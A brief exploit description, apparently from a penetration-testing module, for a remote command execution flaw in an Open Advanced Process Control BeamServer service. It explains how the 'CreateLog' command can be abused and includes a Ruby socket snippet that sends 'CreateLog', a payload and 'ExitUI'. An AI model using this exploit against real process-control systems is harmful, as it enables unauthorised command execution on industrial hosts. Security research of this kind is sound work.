## Open Advanced Process Control BeamServer RCE
The process takes in a few ASCII commands. By placing
a file in the appropiate place when using 'CreateLog',
operating system commands can be executed in the context
of the currently logged in user. 
```
sock.write("CreateLog #{path}\r\n")
res = sock.get_once()
puts res

sock.write(payload + "\r\n")
res = sock.get_once()
puts res

sock.write("ExitUI\r\n")
```
